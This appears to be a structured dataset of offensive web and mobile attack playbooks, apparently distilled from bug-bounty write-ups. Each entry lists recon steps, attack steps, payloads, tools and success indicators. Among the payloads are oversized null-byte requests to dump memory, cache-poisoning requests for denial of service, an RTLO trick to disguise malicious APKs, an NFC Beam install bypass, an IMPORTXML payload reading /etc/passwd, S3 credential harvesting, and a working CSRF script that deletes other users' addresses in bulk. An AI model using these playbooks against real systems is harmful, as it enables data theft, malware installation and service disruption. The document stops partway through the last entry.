The application attempts to process strings without proper length validation, relying on null terminators.
skip_if: The application sanitizes or rejects inputs containing null bytes prior to backend processing.
The backend C application correctly validates string lengths against provided buffers.

recon_steps: Step 1: Identify input fields on the web application, particularly registration forms.
Step 2: Attempt to submit registration requests with common special characters and URL-encoded sequences like null bytes (%00), CRLF (%0d%0a), spaces, and Unicode characters in email fields.
attack_steps: Step 1: Send a POST request to the user registration endpoint with an email address containing a URL-encoded null byte, e.g., `victim%00@domain.com`.
Step 2: Observe the reflected email address in the response. If the null byte is replaced with an unexpected character (e.g., 'L'), this indicates potential buffer manipulation.
Step 3: Send a POST request with multiple URL-encoded null bytes, e.g., `victim%00%00%00@domain.com`, to trigger more significant buffer overflows.
Step 4: Send a POST request with an extremely large number of null bytes, exceeding expected buffer sizes, to trigger a substantial memory dump.
Step 5: Analyze the response body for leaked sensitive information such as RSA private keys, internal HTTP requests, DOMs of other users, plaintext usernames, and passwords.
payloads_or_patterns: <POST body with a very large number of %00 characters>
tools_recommended: Burp Suite: Repeater for sending modified requests and observing responses, Intruder for fuzzing null byte variations.
success_indicators: The response body contains human-readable data and memory dumps.
Leaked sensitive information such as RSA private keys, credentials, or internal system data is present in the response.
failure_indicators: Registration fails with an error indicating invalid email format for inputs with null bytes.
The null byte is correctly sanitized or ignored without causing any observable buffer manipulation or memory leaks.
A fixed character (e.g., 'L') replaces the null byte, but no memory is leaked.

playbooks.impact: Disclosure of sensitive information including private keys, internal requests, user credentials, and other confidential data, leading to potential full system compromise.
playbooks.key_lesson: When processing strings, especially from user input, ensure explicit length checks are performed on the C backend to prevent null byte buffer overflows. Relying on null terminators alone without length validation is insecure.

meta.title: [Leak] Can I take the user information, please?!!

tech_stack_fingerprints: HTTP response contains API endpoint patterns like /api/user/

trigger_conditions.when_to_apply: When an API endpoint exists that checks for username availability and responds with user details.
prerequisites: Ability to send unauthenticated HTTP requests to the target.
applicability_signals: An API endpoint that accepts a `q` parameter for username queries.
The same endpoint accepts a `size` parameter.
skip_if: The API endpoint does not exist.
The API endpoint requires authentication.
The `size` parameter is not accepted or does not affect the response.
The API endpoint does not return user information when `q` is empty.

recon_steps: Step 1: Intercept requests made during user creation or username availability checks to identify relevant API endpoints.
Step 2: Observe requests to endpoints like `/api/user/endpoint_name` which accept a `q` parameter for username queries.
attack_steps: Step 1: Send a GET request to the identified endpoint with an empty `q` parameter and a specified `size` value. Example: `GET <TARGET_URL>/api/user/endpoint_name?q=&size=100`
Step 2: Analyze the response for user information such as email, phone number, UUID, and company details.
Step 3: Increment the `size` parameter to retrieve more user records if the initial response is limited.
tools_recommended: Burp Suite: To intercept and modify HTTP requests, and observe responses.
curl: For scripting and automated testing of the endpoint.
success_indicators: HTTP response contains details of one or more users (email, phone number, UUID, company information) when the `q` parameter is empty.
The number of returned user records matches the value of the `size` parameter.
failure_indicators: 400 Bad Request or similar error if the `q` parameter is required.
401 Unauthorized or 403 Forbidden if authentication is required.
No user information in the response, or only generic error messages.
The `size` parameter does not limit the number of results or has no effect.

playbooks.impact: Disclosure of sensitive user information including email, phone number, UUID, and company details for multiple users, potentially leading to further exploitation or privacy violations.
playbooks.key_lesson: Always test API endpoints that check for data availability (like username or email uniqueness) by leaving input parameters empty and observing the response for unintended information disclosure, especially when size-limiting parameters are present.

meta.title: Android Reddit App leaks images

trigger_conditions.when_to_apply: When a user uploads an image using the Reddit Android app, and the app might recompress the image in a way that causes data leakage from other recently processed images.
prerequisites: User must be logged into the Reddit Android app.
User must upload an image.
applicability_signals: Images uploaded via the Reddit Android app exhibit unexpected artifacts or content ('ghosts') not present in the original image.
The decompiler reveals the use of Fresco and JCodec libraries in the Reddit Android app.
skip_if: Image uploads consistently produce expected results without any embedded data from other sources.

recon_steps: Step 1: Download and install the Reddit Android app.
Step 2: Analyze the app's decompiled code to identify image processing libraries (e.g., Fresco, JCodec).
Step 3: Observe image uploads to i.redd.it from the app for any anomalies or unexpected embedded data.
attack_steps: Step 1: Take multiple photos with a smartphone, some containing sensitive information.
Step 2: Use the Reddit Android app to upload one of these photos.
Step 3: After uploading, examine the shared image on Reddit and other platforms for any leaked data from the other photos taken.
Step 4: If leakage is observed, analyze the progressive JPEG layers of the affected image to pinpoint where the leakage occurs.
Step 5: Attempt to reproduce the issue with different image types and sizes.
payloads_or_patterns: Not applicable for this vulnerability, as it's a functional bug in image processing.
tools_recommended: JPEGSnoop: To analyze JPEG image layers.
Python script: To split progressive JPEG layers.
APK decompiler (e.g., jadx): To analyze Android application code.
success_indicators: The shared image contains visible artifacts or complete data from another image that was recently processed or intended for a different upload.
Analysis of JPEG layers reveals unintended data embedded in specific layers.
failure_indicators: The uploaded image appears as expected, with no extraneous data or artifacts. This indicates the specific conditions for the bug are not met.
If the app consistently reprocesses images without this side effect, the attack cannot be performed.

playbooks.impact: Sensitive information from other images taken on the user's phone can be unintentionally leaked and embedded within a posted image, potentially exposing private data to the public.
playbooks.key_lesson: Investigate image processing libraries in mobile applications for potential data leakage bugs, especially when users report unexpected image artifacts or content.

meta.title: Illegal Rendered at Download Feature in Several Apps (including Opera Mini) that Lead to Extension Manipulation (with RTLO)

trigger_conditions.when_to_apply: When a mobile application or browser has a download feature that fails to properly parse and render Right-to-Left Override (RTLO) characters in filenames.
prerequisites: The target application must have a file download feature.
applicability_signals: The application's download feature accepts user-provided filenames.
The application does not properly sanitize or render special characters in filenames, specifically RTLO characters.
skip_if: The application's download feature correctly parses and renders all characters in filenames, including RTLO characters, preventing filename manipulation.

recon_steps: Identify applications with file download functionality.
Investigate the filename handling of the download feature for potential vulnerabilities related to special character parsing.
attack_steps: Step 1: Craft a malicious filename using RTLO characters and a fake extension followed by the real extension. The format is: `malicious<RTLO_Char><fake_ext>.<real_ext>`.
Step 2: Provide the crafted filename to the target application's download feature.
Step 3: Observe how the application saves the file. The goal is for the application to interpret the filename incorrectly, leading to the actual file type being hidden or misrepresented.

Step 4: Instruct the victim to download the file and attempt to execute it, relying on the misrepresented file extension to trick the user into running a malicious payload (e.g., an APK disguised as a PNG).
tools_recommended: URL encoder for RTLO characters (e.g., %E2%80%AE for RLO), Burp Suite for intercepting and modifying download requests if applicable.
success_indicators: The downloaded file's name is displayed with the manipulated extension (e.g., `malicioustxt.png`).
The file is executed as the intended malicious file type (e.g., .apk) despite having a seemingly benign extension (.png).
failure_indicators: The filename is saved with the original, unmanipulated extension (`malicious%E2%80%AEgnp.txt`). This indicates proper character rendering. Pivot: Try other special characters or encoding schemes.

playbooks.impact: Attacker can trick users into downloading and executing malicious files by disguising their true file type through filename manipulation, leading to potential code execution, data theft, or other malware-related impacts.
playbooks.key_lesson: When dealing with file download features, always validate and sanitize filenames to prevent manipulation through special characters like RTLO, and ensure the true file extension is correctly displayed and enforced.

meta.title: Responsible denial of service with web cache poisoning
meta.programs: Tesla, HackerOne, Deliveroo, Bitbucket, Paypal, Meta / Facebook, Twitter
meta.vuln_type: Web Cache Poisoning, Denial of Service

affected_components: Any web application relying on a caching layer that does not properly sanitize cache keys, particularly with custom headers or specific query parameters.
tech_stack_fingerprints: Presence of a WAF (e.g., `waf@tesla.com` in error message)

trigger_conditions.when_to_apply: When a web application uses a caching layer that includes non-standard or user-controllable headers/parameters in its cache key. This is especially relevant if the application's WAF or frontend returns a cacheable error or redirect page for malicious requests.
prerequisites: The target must use a web cache.
The cache key generation must be vulnerable to poisoning (e.g., including user-controlled headers/parameters that are not intended to be part of the cache key or are mishandled).
The target application or its WAF must return a consistent, cacheable response (e.g., a block page, an error page, or a redirect) for requests containing specific malicious payloads.
applicability_signals: Observing non-standard headers that influence responses (e.g., `X-Forwarded-Port`, `Any-Header`)
WAF blocking pages that are returned with HTTP 200 or 302 status codes and appear to be cacheable.
Application behavior that varies based on unusual HTTP headers.
skip_if: The cache key is strictly based on the URL path and query string without any header influence.
All responses to potentially malicious requests are dynamic and non-cacheable (e.g., always returning 403 Forbidden without cacheable content).
The WAF effectively blocks all attempts to trigger specific responses before they can be cached.

recon_steps: Step 1: Identify web cache behavior by sending identical requests with slight variations in headers (e.g., `X-Forwarded-For`, `X-Forwarded-Proto`, custom headers) and observe response times and content. Look for consistent responses to different initial requests.

Step 2: Use Burp Suite's Cache Miner or custom scripts to systematically probe cache behavior, focusing on how different headers and query parameters affect the cache key. Target specific endpoints that might return error or redirect pages.

Step 3: Identify payloads that trigger specific, potentially cacheable, responses from the web application or its WAF. This often involves researching common WAF bypass techniques or error message patterns.
attack_steps: Step 1: Send a request to the target URL containing a malicious header or parameter designed to trigger a specific, cacheable response (e.g., a WAF block page or a malformed redirect). Use a unique, non-production value (like a burpcollaborator.net subdomain or a specific port number) to make the trigger distinctive.

Step 2: Immediately after sending the triggering request, send a normal request to the same URL. If the cache is poisoned, the normal request will receive the cached malicious response instead of the expected content.

Step 3: To achieve DoS, ensure the poisoned response is persistent and affects a critical part of the application or redirects users to a non-existent or error-prone location. For a single-request DoS, the poisoned response itself should be an error or redirect that causes timeouts or broken functionality for subsequent users.
payloads_or_patterns:
GET /<path>?dontpoisoneveryone=1 HTTP/1.1
Host: <TARGET_URL>
Any-Header: burpcollaborator.net

 (for WAF block page poisoning)

GET /<path>?dontpoisoneveryone=1 HTTP/1.1
Host: <TARGET_URL>
X-Forwarded-Port: 123

 (for redirect poisoning with invalid port)
Exploit chains targeting specific cache key vulnerabilities, like those affecting Drupal or other CMSs.
tools_recommended: Burp Suite (Repeater, Intruder, Collaborator Client, Cache Miner extension)
Custom Python scripts for automated testing and timing analysis.
success_indicators: Subsequent requests to the same URL receive the malicious response (e.g., 'Access Denied', a malformed redirect page) instead of the expected content.
A non-standard HTTP status code (e.g., 403) is cached and returned for a valid request.
A redirect to an invalid or internal-only URL is served to users for a valid request.
Observing the unique payload value (e.g., burpcollaborator.net interaction) in a non-malicious request's response.
failure_indicators: All subsequent requests receive the correct content, indicating the cache was not poisoned or the poisoned object was purged quickly.
A 403 Forbidden or other error response is received for the poisoned request, but it is not cacheable or does not affect subsequent users.
The WAF blocks the request before it can reach the cache or trigger the desired response.

playbooks.impact: Denial of Service (DoS) against a critical part of the target's website or service. This can range from making specific pages inaccessible to potentially taking down significant portions of the site for an extended period, impacting availability and user access.
playbooks.key_lesson: Investigate web cache poisoning vulnerabilities, as they can be weaponized for effective denial of service attacks with minimal attacker effort by poisoning cache entries with error pages or invalid redirects.

meta.title: NFC Beaming Bypasses Security Controls in Android [CVE-2019-2114]

affected_components: NFC Service, Android Beam feature, 'Install unknown apps' permission handling
tech_stack_fingerprints: Device supports NFC and Android Beam

trigger_conditions.when_to_apply: When a target Android device is running version 8 (Oreo) or higher, has NFC and Android Beam enabled, and the attacker can achieve physical proximity to the target device.
prerequisites: Target device must have NFC and Android Beam enabled.
Target device must be running Android 8 (Oreo) or a later version.
Attacker must have a rogue device (e.g., a malicious payment terminal or another Android phone) capable of sending APKs via Android Beam.
applicability_signals: Confirmation that the target device is running Android 8+.
Observation that NFC and Android Beam features are enabled on the target device.
Within the target device's 'Settings' -> 'Security' -> 'Install unknown apps', the 'NFC Service' is listed as allowed to install applications (especially when 'Show system' is enabled).
skip_if: Target device is running a version of Android older than 8.
NFC or Android Beam features are disabled on the target device.
The 'NFC Service' is explicitly denied 'Install unknown apps' permission and the system has been patched against CVE-2019-2114.

recon_steps: Step 1: Identify target devices running Android 8 (Oreo) or higher.
Step 2: If possible, confirm if NFC and Android Beam are enabled on the target devices. This might be inferred from device model or user behavior.

Step 3: On a test device with similar Android version and settings, navigate to 'Settings' -> 'Security' -> 'Install unknown apps' and enable 'Show system' to verify if 'NFC Service' has install permissions by default.
attack_steps: Step 1: Prepare an APK file containing the desired malware or malicious payload on the attacker's device.
Step 2: Initiate an Android Beam transfer of the prepared APK file from the attacker's device to the target device.
Step 3: When the target device receives the transfer, a 'Beam completed' notification will appear. The user taps this notification.
Step 4: Instead of prompting for 'Install unknown apps' permission, the transfer will directly lead to the installation prompt for the malicious APK, bypassing the security control.
payloads_or_patterns: Any valid APK file can be used as a payload. Example: <path_to_malicious.apk>
tools_recommended: Two Android devices (one as sender, one as receiver).
File manager app on sender device to select and share APK.
A prepared APK file for testing.
success_indicators: The 'Install unknown apps' permission prompt is bypassed.
The malicious APK proceeds directly to the installation screen on the receiver device.
The malicious APK is successfully installed on the receiver device without explicit user consent beyond initiating the beam transfer and tapping the notification.
failure_indicators: The target device prompts for 'Install unknown apps' permission, indicating the vulnerability is not present or patched.
The NFC beam transfer fails or is rejected by the target device.
Android Beam feature is not available or not enabled on the target device, leading to no transfer initiation.

playbooks.impact: An attacker can remotely install arbitrary applications (malware) on a target Android device without the user's explicit permission to install apps from unknown sources, potentially leading to data theft, device compromise, or integration into botnets.
playbooks.key_lesson: Always verify that system services with elevated privileges (like 'NFC Service') do not implicitly bypass security controls designed for user applications, especially when those services can initiate software installations.

meta.title: CPDoS: Cache Poisoned Denial of Service
meta.programs: Microsoft, Amazon, Akamai, Cloudflare, Yahoo! / Verizon Media, Play Framework
meta.category: Denial of Service, Web cache poisoning

target_profile.technology: Web applications using CDNs or proxy caches
affected_components: Resources served via CDN or proxy cache
tech_stack_fingerprints: Presence of CDN (e.g., Cloudflare, Akamai, AWS CloudFront)

trigger_conditions.when_to_apply: When a web application utilizes a cache (CDN or proxy) and the origin server has a stricter header size limit than the cache.
prerequisites: Target resource is served through a CDN or proxy cache.
Cache server accepts larger HTTP headers than the origin server.
applicability_signals: CDN is identified (e.g., via DNS records, HTTP headers like `Server` or `X-Cache`).
The target resource is cacheable (e.g., static assets, HTML pages).
skip_if: Origin server and cache have identical HTTP header size limits.
The WAF or CDN aggressively sanitizes or rejects oversized headers.

recon_steps: Step 1: Identify if the target is using a CDN by checking DNS records (CNAMEs) and HTTP headers (e.g., `Server`, `X-Cache`, `CF-Cache-Status`).

Step 2: Determine the cache's HTTP header size limit and the origin server's HTTP header size limit. This may require manual testing with progressively larger headers or consulting documentation if available.
attack_steps: Step 1: Craft an HTTP GET request to a target resource.

Step 2: Include a malicious header (e.g., an oversized header) that is within the cache's accepted size limit but exceeds the origin server's limit. This can be achieved by adding many headers or one header with an oversized key or value.
Step 3: Send the crafted request to the target URL.
Step 4: Observe the response. If the origin server returns an error page (e.g., 400 Bad Request) due to the oversized header, and the cache stores this error page.
Step 5: Subsequent legitimate requests for the same resource will receive the cached error page instead of the original content.
payloads_or_patterns:
GET /<TARGET_RESOURCE> HTTP/1.1
Host: <TARGET_HOST>
User-Agent: Mozilla/5.0
Accept: */*

[Add multiple headers like 'X-Oversized-Header-N: Big-Value-...' until size limit is approached]
tools_recommended: Burp Suite: To craft and send custom HTTP requests and monitor responses.
Curl: For sending specific HTTP requests and inspecting headers.
success_indicators: Response from the server is an error page (e.g., 400 Bad Request) when the crafted request is sent.
Subsequent requests to the same resource return the error page instead of the intended content.
failure_indicators: The request is rejected by the CDN/WAF before reaching the origin server (e.g., 403 Forbidden).
The origin server does not error out despite the oversized header, indicating limits are aligned or the header is sanitized.
Response indicates the original content is still served, meaning the error page was not cached.

playbooks.impact: Denial of Service (DoS) by making specific web resources or entire web pages unavailable to legitimate users by poisoning the cache with error pages. This can disrupt service availability and cause significant business impact.
playbooks.key_lesson: When dealing with CDNs or proxy caches, always investigate the size limits of HTTP headers accepted by the cache versus the origin server, as disparities can lead to cache poisoning and DoS vulnerabilities.

meta.title: Escalating Privileges like a Pro

affected_components: Insufficient detail in writeup (mentions actions like making payments, adding contacts, sending messages, viewing orders, dropping users)

trigger_conditions.when_to_apply: When an application allows users to create, receive, or delete information and there's a possibility to manipulate user roles or group memberships.
prerequisites: Attacker must have access to at least two user accounts with different privilege levels (one lower, one higher).
applicability_signals: Endpoints that perform CRUD operations on sensitive data (e.g., `/user/viewOrder.jsp`).
Parameters that define user groups or roles (e.g., `groupID`).
Parameters that identify specific data instances (e.g., `orderID`).
skip_if: The application strictly enforces access control at the backend and does not allow parameter manipulation for authorization checks.

recon_steps: Identify functionality that involves data manipulation (create, read, update, delete) or access to specific resources.
Record requests made by a low-privileged user performing such actions.
If possible, record the same action performed by a high-privileged user.
attack_steps: Intercept a request made by a low-privileged user performing an action (e.g., POST /user/viewOrder.jsp).
Identify parameters that might control authorization or resource access (e.g., `groupID`, `orderID`).

Modify these parameters to values associated with a higher-privileged user or resource (e.g., change `groupID=grp001` to `groupID=grpAdmin` or `orderID=0001` to `orderID=9999` if 9999 belongs to an admin).
Send the modified request.
Analyze the response for signs of successful privilege escalation.
payloads_or_patterns:
POST /user/viewOrder.jsp HTTP/1.1
Host: <TARGET_URL>
...
groupID=grp001&orderID=0001
(Modify grp001 and 0001)
tools_recommended: Burp Suite: To intercept, modify, and re-send requests.
Autorize (Burp Extension): To automate the testing of authorization enforcement by replacing cookies and headers across requests.
success_indicators: Receiving a 200 OK response when the original request would have returned a 403 Forbidden or unauthorized error.
Accessing data or functionality that should only be available to higher-privileged users (e.g., viewing an admin's order details).
failure_indicators: Receiving a 403 Forbidden error after modifying parameters. This indicates that the application correctly enforces access control based on the parameters.
Receiving a 404 Not Found error if the manipulated parameter leads to a non-existent resource.

playbooks.impact: Unauthorized access to sensitive information, execution of administrative functions, or modification/deletion of data belonging to other users or privileged accounts.
playbooks.key_lesson: Test parameter manipulation in requests related to data access or modification by substituting values associated with higher privilege levels.

meta.title: A Tale of Exploitation in Spreadsheet File Conversions
meta.authors: Brett Buerhaus, Cody Brocious (Daeken), Sam Erb (erbbysam), Olivier Beg (Smiegles)

affected_components: File conversion service (e.g., XLSX to PDF)
tech_stack_fingerprints: LibreOffice INFO functions in XLSX/ODS files (e.g., =INFO("osversion"), =INFO("directory"))
Response to uploaded .odt file ending in _converted.pdf

trigger_conditions.when_to_apply: When a web application accepts file uploads for conversion (e.g., document to PDF) and utilizes LibreOffice for processing, especially if client-side extension validation is weak.
prerequisites: The target application must perform file conversions using LibreOffice.
The application must accept file uploads for conversion.
applicability_signals: The application renders uploaded files, potentially with a file conversion endpoint or function.
The application allows uploading file types that LibreOffice can process (e.g., XLSX, ODS, ODT).
The application may reveal LibreOffice version through PDF metadata or INFO functions.
The application's client-side file extension validation is weak, allowing bypass with different extensions.
skip_if: The application strictly validates file types and extensions server-side, rejecting any non-whitelisted types.
The file conversion process is sandboxed in a way that prevents access to the filesystem or outbound network connections.

recon_steps: Step 1: Upload a crafted XLSX file containing LibreOffice INFO functions (e.g., =INFO("osversion"), =INFO("directory")) to the target's file conversion feature. Observe the response for any embedded information or errors.
Step 2: If available, observe PDF metadata from converted files. This can reveal the LibreOffice version and OS information.
Step 3: Test file extension bypass by uploading an ODS file renamed to .xlsx and observe if it's processed as an ODS file. This indicates weak server-side validation.
attack_steps: Step 1: Craft an XLSX file with the =INFO("directory") function in a cell that will be processed by LibreOffice. Upload this file to the target's conversion endpoint.
Step 2: If the directory function reveals a path, attempt to craft an ODS file with a different extension (e.g., .txt) and upload it, hoping the server-side validation is weak and it gets processed.
Step 3: If the directory disclosure is successful, attempt to craft a malicious ODS/XLSX file that leverages the known path for Local File Inclusion (LFI) by including paths like /etc/passwd.
Step 4: If LFI is not immediately successful, consider leveraging the Python-UNO bridge for SSRF or RCE if other vulnerabilities are present or discoverable within the LibreOffice conversion process.
payloads_or_patterns: Payload for LFI: `=IMPORTXML("file:///etc/passwd", "/etc/passwd")` (example, requires specific LibreOffice function and parsing)
tools_recommended: LibreOffice (to create crafted documents)
Burp Suite (to intercept and analyze requests/responses, and for manual testing of file uploads)
success_indicators: The converted file contains information from the file system (e.g., user accounts from /etc/passwd).
The converted file contains OS version information derived from =INFO("osversion").
An unexpected response or error from the conversion service that hints at file system access.
Callback to attacker-controlled server if SSRF is achieved through Python-UNO bridge abuse.
failure_indicators: Consistent rejection of uploaded files due to strict extension validation (suggests no bypass possible).
Error messages indicating that the INFO function is not supported or returns an unexpected result (suggests an older or different version of spreadsheet software).
No sensitive information or directory paths are revealed in the output (suggests LFI is not directly exploitable via this method).

playbooks.impact: Local File Inclusion (LFI) leading to disclosure of sensitive system files like /etc/passwd. Potential for Server-Side Request Forgery (SSRF) or Remote Code Execution (RCE) through misuse of the Python-UNO bridge.
playbooks.key_lesson: Always test file upload functionalities that perform document conversions with crafted files containing spreadsheet functions designed to reveal system information or facilitate path traversal.

meta.title: 1-800-Flowers Credentials and message log leak via facebook.com/facebook

trigger_conditions.when_to_apply: This technique is applicable when a publicly accessible S3 bucket is discovered that contains sensitive application secrets, API keys, or user data related to integrated third-party applications.
prerequisites: An observable S3 bucket URL or prefix.
applicability_signals: The presence of a URL pointing to an AWS S3 bucket, e.g., 'platf-prod.s3.us-west-2.amazonaws.com'.
skip_if: The S3 bucket is confirmed to be private or does not contain any sensitive information.

recon_steps: Step 1: Identify publicly accessible S3 buckets from application source code, error messages, or subdomain enumeration.
Step 2: Attempt to access the identified S3 bucket URL to check for public listing of contents.
attack_steps: Step 1: Download all files from the public S3 bucket using 'aws s3 sync s3://<BUCKET_NAME>/ /<LOCAL_DIR>/'.
Step 2: Unzip any compressed files found within the bucket.
Step 3: Inspect downloaded files for sensitive information such as API keys, credentials, access tokens, and user data.
Step 4: Analyze message logs for user information and PII.
tools_recommended: AWS CLI: for syncing and downloading bucket contents.
File analysis tools (grep, strings, zip utilities): for inspecting downloaded files.
success_indicators: Discovery of sensitive information like API secrets, active access tokens, or user data (phone numbers, emails, messages) within the downloaded files.
The S3 bucket itself lists its contents publicly.
failure_indicators: The S3 bucket returns 'Access Denied' or does not list any content, indicating it is not publicly accessible or misconfigured.
Downloaded files do not contain any sensitive information.

playbooks.impact: Exposure of sensitive credentials (API keys, access tokens) for third-party integrations (1-800-Flowers, Stripe.com) and potential access to user messages, phone numbers, and PII from interactions with a Facebook chatbot.
playbooks.key_lesson: Always scan for and inspect publicly accessible AWS S3 buckets, as they can often contain leaked credentials, API keys, and sensitive user data.

meta.title: An inconsistent CSRF

trigger_conditions.when_to_apply: When a web application allows authenticated users to delete sensitive data (like shipping addresses) via a POST request to an endpoint that is missing CSRF protection and uses a dynamic, user-specific ID.
prerequisites: User must be authenticated.
applicability_signals: POST request to /MySettings/DeleteAddress endpoint.
Absence of CSRF tokens in requests.
An `addressId` parameter that varies numerically between users.
skip_if: The `addressId` is not predictable or guessable.
Rate limiting is aggressively enforced on the delete endpoint.
The `addressId` is not numeric and cannot be brute-forced.

recon_steps: Step 1: Log in as a regular authenticated user.
Step 2: Navigate to the 'My Settings' section and identify functionality related to managing addresses (e.g., adding, editing, deleting).
Step 3: Intercept requests for address deletion using a proxy (e.g., Burp Suite).
Step 4: Observe the HTTP request for the delete address functionality. Note the endpoint, HTTP method, and parameters.
Step 5: Analyze the `addressId` parameter. If it's numeric and appears to be unique per user, this is a strong applicability signal.
attack_steps: Step 1: Craft a CSRF payload using HTML and JavaScript.
Step 2: The JavaScript should dynamically generate POST requests to the target endpoint (/MySettings/DeleteAddress).
Step 3: The `addressId` parameter should be iterated through a range of plausible numeric values (e.g., starting from a known addressId and incrementing).
Step 4: The JavaScript should send these requests using XMLHttpRequest, ensuring `withCredentials` is set to `true` to send the user's session cookies.
Step 5: Host this CSRF payload on a controlled external server or provide it to the victim directly.
payloads_or_patterns:
<html>
<!-- Dynamic CSRF PoC To delete address from any account -->
<script>
function submitRequest(id) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "<TARGET_URL>/MySettings/DeleteAddress?addressId="+id, true);
    xhr.setRequestHeader("Accept", "*/*");
    xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
    xhr.setRequestHeader("Content-Type", "application/json; charset=utf-8");
    xhr.withCredentials = true;
    var body = "{}";
    var aBody = new Uint8Array(body.length);
    for (var i = 0; i < aBody.length; i++) aBody[i] = body.charCodeAt(i);
    xhr.send(new Blob([aBody]));
}

// Adjust range based on observed addressIds
for (i=14400; i < 14510; i++) {
    submitRequest(i);
}
</script>
</html>
tools_recommended: Burp Suite: To intercept requests and identify the delete address endpoint and `addressId` parameter.
Custom JavaScript POC: As described in the attack steps to perform the brute-force iteration within the victim's browser.
success_indicators: The victim's shipping address is deleted from their account after they visit the CSRF payload page.
No specific response content is required for success, only the observable action of data deletion.
